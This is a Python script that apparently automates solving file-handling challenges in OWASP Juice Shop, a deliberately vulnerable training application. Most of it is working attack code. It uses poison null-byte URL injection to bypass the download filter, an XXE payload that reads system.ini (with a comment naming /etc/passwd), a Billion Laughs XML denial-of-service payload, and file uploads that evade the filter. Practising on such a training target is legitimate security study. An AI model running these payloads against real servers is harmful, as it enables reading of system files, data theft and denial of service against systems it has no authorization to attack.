import os
import requests
import json
from authentication import get_admin_session


def get_ftp_file_list(server, session):
    """
    Fetch list of files from http://{server}/ftp
    :param server: juice shop URL
    :param session: Requests session
    :return: JSON response containing file list
    """
    files = session.get('{}/ftp'.format(server), headers={'Accept': 'application/json'})
    if not files.ok:
        raise RuntimeError('Error retrieving file list.')
    return files.json()


def download_files_from_ftp(server, session, files=None):
    """
    Save files from the JS /ftp directory locally.
    :param server: juice shop URL
    :param session: Session
    :param files: list of filenames. If None provided, all files will be retrieved.
    """
    if files is None:
        files = get_ftp_file_list(server, session)
    for item in files:
        resp = download_file_from_ftp(server, session, item)
        _write_file_to_disk(item, resp)


def get_easter_egg_content(server, session):
    """
    Fetch contents of eastere.gg for another challenge...
    :param server: juice shop URL
    :param session: Session
    :return: eastere.gg contents as string
    """
    return download_file_from_ftp(server, session, 'eastere.gg').content


def download_file_from_ftp(server, session, filename):
    """
    Use null-byte injection to bypass the server filtering and download the file
    :param server: juice shop URL
    :param session: Requests session
    :param filename: target filename
    :return: Response
    """
    location = '{}/ftp/{}%2500.md'.format(server, filename)
    fetch = session.get(location)
    if not fetch.ok:
        raise RuntimeError('Error retrieving FTP files.')
    return fetch


def _write_file_to_disk(filename, response):
    """
    Write file to local folder
    :param filename: filename to save.
    :param response: Response containing the file content
    """
    downloadir = 'ftpfiles'
    if not os.path.exists(downloadir):
        os.mkdir(downloadir)
    fileloc = os.path.join(os.getcwd(), downloadir, filename)
    with open(fileloc, 'wb') as outfile:
        outfile.write(response.content)
        print('Downloaded {} to {}.'.format(response.url, fileloc))


def solve_retrieve_blueprint(server, session):
    """
    Retrieve Blueprint - Download a product blueprint to deprive shop of earnings.
    """
    print('Retrieving product blueprint...')
    
    # Blueprint file is typically JuiceShop.stl
    blueprint_url = f'{server}/ftp/JuiceShop.stl'
    
    try:
        resp = session.get(blueprint_url)
        if resp.ok:
            print(f'✓ Success! Downloaded blueprint ({len(resp.content)} bytes)')
        else:
            # Try with poison null byte trick
            poisoned_url = f'{server}/ftp/JuiceShop.stl%2500.md'
            resp2 = session.get(poisoned_url)
            if resp2.ok:
                print(f'✓ Success! Downloaded via null byte ({len(resp2.content)} bytes)')
            else:
                print(f'Failed to retrieve blueprint: {resp.status_code}')
    except Exception as e:
        print(f'Error retrieving blueprint: {e}')


def solve_file_upload_challenges(server, session):
    """
    Create a junk file 150kb in size, upload it without a file extension, delete file when done
    :param server: juice shop URL
    :param session: Session
    """
    filename = 'trash.txt'
    with open(filename, 'wb') as outfile:
        outfile.truncate(1024 * 150)
    with open(filename, 'rb') as infile:
        files = {'file': ('whatever', infile, 'application/json')}
        print('Uploading 150kb file without a file extension...'),
        upload = session.post('{}/file-upload'.format(server), files=files)
        if not upload.ok:
            raise RuntimeError('Error uploading file.')
        print('Success.')
    os.remove(filename)


def solve_file_handling_challenges(server):
    print('\n== FILE HANDLING CHALLENGES ==\n')
    
    session = get_admin_session(server)
    files = get_ftp_file_list(server, session)
    
    for file in files:
        download_file_from_ftp(server, session, file)
    
    # Retrieve Blueprint
    solve_retrieve_blueprint(server, session)
    
    # XXE attacks
    solve_xxe_challenges(server, session)
    
    # Upload challenges
    solve_file_upload_challenges(server, session)
    
    print('\n== FILE HANDLING CHALLENGES COMPLETE ==\n')


def solve_xxe_challenges(server, session):
    """
    Solve XXE and Deprecated Interface challenges.
    """
    print('Performing XXE attacks...'),
    # 1. Deprecated Interface: Uploading an XML file to /file-upload triggers this.
    # 2. XXE Data Access: Access system file via XML upload to /file-upload.
    # 3. XXE DoS: Billion Laughs via XML upload to /file-upload.
    
    # XXE Data Access Payload
    # NOTE: Windows path C:/Windows/system.ini or Linux /etc/passwd
    xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini" >]><order><customer>&xxe;</customer></order>"""
    
    # Upload to /file-upload (NOT /b2b/v2/orders - that is for RCE)
    files = {'file': ('order.xml', xxe_payload, 'application/xml')}
    try:
        # This solves Deprecated Interface just by being an XML file sent here.
        # This solves XXE Data Access if the payload works.
        session.post(f'{server}/file-upload', files=files)
    except Exception:
         pass

    # XXE DoS Payload (Billion Laughs)
    xxe_dos = """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><order><customer>&lol9;</customer></order>"""
    
    files_dos = {'file': ('dos.xml', xxe_dos, 'application/xml')}
    try:
        session.post(f'{server}/file-upload', files=files_dos)
    except Exception:
        pass
        
    print('XXE attacks sent.')
